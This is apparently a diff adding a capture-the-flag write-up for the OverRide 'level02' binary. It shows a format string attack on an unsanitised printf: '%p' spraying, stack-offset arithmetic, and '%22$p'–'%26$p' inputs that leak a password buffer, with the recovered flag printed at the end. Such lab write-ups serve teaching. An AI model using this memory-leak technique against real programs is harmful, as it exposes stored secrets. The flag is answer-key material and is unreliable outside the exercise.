@@ -1,0 +1,61 @@
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username:
+--[ Password:
+*****************************************
+ does not have access!
+
+# The prog open the file containing the pass and save it in the stack
+
+# When the prog is called, it print printf the username
+--[ Username: quoicou
+--[ Password: b
+*****************************************
+quoicou does not have access!
+
+
+
+# We try a format attack string on this printf
+https://owasp.org/www-community/attacks/Format_string_attack
+
+# We test
+python -c 'print "aaaaaaaa" + "%p " * 50' | ./level02
+
+--[ Username: --[ Password: *****************************************
+aaaaaaaa0x7fffffffe4f0 (nil) 0x70 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 0x2070252070252070 0x7025207025207025 
+0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x207025 (nil) (nil) (nil) (nil) 0x100000000 
+(nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00 0x6161616161616161 0x7025207025207025 
+0x2520702520702520  does not have access!
+
+# we find our aaaaaaaa at positon 28
+
+# SO, 0xa0 (where .pass is stored) | 0x70 (where our username stored)
+>>> 0x70
+112
+>>> 0xa0
+160
+
+0xa0 - 0x70 = 48
+
+# As we see the stack is 8 bytes aligned, we can find the start of the .pass buffer at 28 - (48/8) = 22 in our print
+# We know the .pass to be 40 bytes long 40 / 8 = 5 (size read and flag format)
+# We have to print %22$p %23$p %24$p %25$p %26$p to get it all.
+
+level02@OverRide:~$ ./level02 
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: %22$p %23$p %24$p %25$p %26$p
+--[ Password: 
+*****************************************
+0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d does not have access!
+
+# Now we have to clean it: remove 0x, reverse it (little endian to big endian) then translate it to ascii
+
+# And finally we get the flag !
+
+Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
